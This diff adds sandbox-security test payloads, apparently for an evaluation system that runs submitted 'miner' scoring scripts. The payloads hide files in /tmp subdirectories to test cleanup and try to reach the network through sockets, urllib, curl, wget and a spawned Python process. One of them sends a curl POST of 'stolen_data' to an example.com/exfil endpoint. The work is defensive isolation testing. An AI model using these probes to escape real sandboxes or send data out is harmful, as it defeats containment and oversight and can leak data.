@@ -163,3 +163,203 @@ def score(data: dict) -> dict:
         
     return results
 """
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# EXPLOIT 4b: Hidden File in Existing Subdirectory
+#
+# Instead of writing to /tmp directly, tries to hide a file inside
+# an existing subdirectory under /tmp. Tests whether the recursive
+# os.walk snapshot catches it.
+#
+# Run WRITE then READ in sequence.
+# ─────────────────────────────────────────────────────────────────────────────
+
+EXPLOIT_4B_WRITE = r"""
+def score(data: dict) -> dict:
+    import os
+    import subprocess
+    
+    results = {}
+    
+    # Find existing directories in /tmp
+    tmp_dirs = subprocess.check_output("find /tmp -type d 2>/dev/null", shell=True).decode()
+    results["existing_tmp_dirs"] = tmp_dirs
+    
+    # Try to hide a file inside an existing /tmp directory
+    # (e.g. those UV lock file directories or other pre-existing ones)
+    for line in tmp_dirs.strip().split("\n"):
+        d = line.strip()
+        if d and d != "/tmp" and os.path.isdir(d):
+            hidden_path = os.path.join(d, ".hidden_miner_secret.txt")
+            try:
+                with open(hidden_path, "w") as f:
+                    f.write("MINER A's SECRET hidden in existing dir")
+                results["hidden_file_path"] = hidden_path
+                results["hidden_write_status"] = "SUCCESS"
+                break
+            except Exception as e:
+                results["hidden_write_error"] = f"{d}: {e}"
+    
+    # Also write directly under /tmp in a nested path
+    try:
+        os.makedirs("/tmp/.sneaky_dir/subdir", exist_ok=True)
+        with open("/tmp/.sneaky_dir/subdir/secret.txt", "w") as f:
+            f.write("DEEPLY NESTED SECRET")
+        results["nested_write"] = "wrote to /tmp/.sneaky_dir/subdir/secret.txt"
+    except Exception as e:
+        results["nested_write"] = f"blocked: {e}"
+    
+    return results
+"""
+
+EXPLOIT_4B_READ = r"""
+def score(data: dict) -> dict:
+    import os
+    import subprocess
+    
+    results = {}
+    
+    # Try to find ANY hidden files in /tmp
+    try:
+        find_output = subprocess.check_output(
+            "find /tmp -name '*secret*' -o -name '.hidden*' -o -name '.sneaky*' 2>/dev/null",
+            shell=True
+        ).decode()
+        results["hidden_files_found"] = find_output if find_output.strip() else "NONE FOUND (cleaned correctly) ✓"
+    except Exception as e:
+        results["find_error"] = str(e)
+    
+    # Check for the nested directory
+    try:
+        with open("/tmp/.sneaky_dir/subdir/secret.txt", "r") as f:
+            results["nested_secret"] = f.read()
+    except FileNotFoundError:
+        results["nested_secret"] = "NOT FOUND (cleaned correctly) ✓"
+    except Exception as e:
+        results["nested_secret"] = f"error: {e}"
+    
+    return results
+"""
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# EXPLOIT 6: Network Exfiltration (Socket Monkeypatch Test)
+#
+# Tests ALL possible ways a miner script might try to reach the network:
+#   1. Python socket (monkey-patched by _network_disabled)
+#   2. urllib.request (purged from sys.modules)
+#   3. subprocess curl (external binary, bypasses Python socket)
+#   4. subprocess wget (another external binary)
+#   5. subprocess python3 -c (spawn a new Python process to make requests)
+#
+# EXPECTED: All should fail with RuntimeError or connection refused.
+# ─────────────────────────────────────────────────────────────────────────────
+
+EXPLOIT_6 = r"""
+def score(data: dict) -> dict:
+    results = {}
+    
+    # 1. Direct Python socket — should get RuntimeError from monkeypatch
+    try:
+        import socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("example.com", 80))
+        s.sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
+        resp = s.recv(100)
+        s.close()
+        results["socket_direct"] = f"LEAKED: {resp[:50]}"
+    except RuntimeError as e:
+        results["socket_direct"] = f"BLOCKED (RuntimeError) ✓: {e}"
+    except Exception as e:
+        results["socket_direct"] = f"BLOCKED ({type(e).__name__}): {e}"
+    
+    # 2. urllib.request — should fail because module is purged
+    try:
+        import urllib.request
+        resp = urllib.request.urlopen("http://example.com", timeout=5)
+        results["urllib"] = f"LEAKED: {resp.read(50)}"
+    except RuntimeError as e:
+        results["urllib"] = f"BLOCKED (RuntimeError) ✓: {e}"
+    except ImportError as e:
+        results["urllib"] = f"BLOCKED (ImportError) ✓: {e}"
+    except Exception as e:
+        results["urllib"] = f"BLOCKED ({type(e).__name__}): {e}"
+    
+    # 3. subprocess curl — bypasses Python socket, uses system binary
+    try:
+        import subprocess
+        output = subprocess.check_output(
+            ["curl", "-s", "-m", "5", "http://example.com"],
+            timeout=10,
+            stderr=subprocess.STDOUT
+        ).decode()
+        results["subprocess_curl"] = f"LEAKED: {output[:100]}" if output else "LEAKED (empty)"
+    except subprocess.CalledProcessError as e:
+        results["subprocess_curl"] = f"BLOCKED (exit {e.returncode}): {e.output[:100] if e.output else 'no output'}"
+    except FileNotFoundError:
+        results["subprocess_curl"] = "BLOCKED (curl not installed) ✓"
+    except subprocess.TimeoutExpired:
+        results["subprocess_curl"] = "BLOCKED (timeout) ✓"
+    except RuntimeError as e:
+        results["subprocess_curl"] = f"BLOCKED (RuntimeError) ✓: {e}"
+    except Exception as e:
+        results["subprocess_curl"] = f"BLOCKED ({type(e).__name__}): {e}"
+    
+    # 4. subprocess wget — another common binary
+    try:
+        import subprocess
+        output = subprocess.check_output(
+            ["wget", "-q", "-O", "-", "--timeout=5", "http://example.com"],
+            timeout=10,
+            stderr=subprocess.STDOUT
+        ).decode()
+        results["subprocess_wget"] = f"LEAKED: {output[:100]}" if output else "LEAKED (empty)"
+    except subprocess.CalledProcessError as e:
+        results["subprocess_wget"] = f"BLOCKED (exit {e.returncode})"
+    except FileNotFoundError:
+        results["subprocess_wget"] = "BLOCKED (wget not installed) ✓"
+    except subprocess.TimeoutExpired:
+        results["subprocess_wget"] = "BLOCKED (timeout) ✓"
+    except Exception as e:
+        results["subprocess_wget"] = f"BLOCKED ({type(e).__name__}): {e}"
+    
+    # 5. subprocess python3 -c — spawn fresh Python to bypass monkeypatch
+    try:
+        import subprocess
+        code = 'import urllib.request; print(urllib.request.urlopen("http://example.com").read(50))'
+        output = subprocess.check_output(
+            ["python3", "-c", code],
+            timeout=10,
+            stderr=subprocess.STDOUT
+        ).decode()
+        results["subprocess_python"] = f"LEAKED: {output[:100]}" if output else "LEAKED (empty)"
+    except subprocess.CalledProcessError as e:
+        results["subprocess_python"] = f"BLOCKED (exit {e.returncode}): {e.output.decode()[:100] if e.output else 'no output'}"
+    except subprocess.TimeoutExpired:
+        results["subprocess_python"] = "BLOCKED (timeout) ✓"
+    except Exception as e:
+        results["subprocess_python"] = f"BLOCKED ({type(e).__name__}): {e}"
+    
+    # 6. Try uploading via curl POST (active exfiltration attempt)
+    try:
+        import subprocess
+        output = subprocess.check_output(
+            ["curl", "-s", "-m", "5", "-X", "POST",
+             "-d", "stolen_data=hello",
+             "http://example.com/exfil"],
+            timeout=10,
+            stderr=subprocess.STDOUT
+        ).decode()
+        results["curl_upload"] = f"LEAKED: {output[:100]}" if output else "LEAKED (empty)"
+    except FileNotFoundError:
+        results["curl_upload"] = "BLOCKED (curl not installed) ✓"
+    except subprocess.CalledProcessError as e:
+        results["curl_upload"] = f"BLOCKED (exit {e.returncode})"
+    except subprocess.TimeoutExpired:
+        results["curl_upload"] = "BLOCKED (timeout) ✓"
+    except Exception as e:
+        results["curl_upload"] = f"BLOCKED ({type(e).__name__}): {e}"
+    
+    return results
+"""
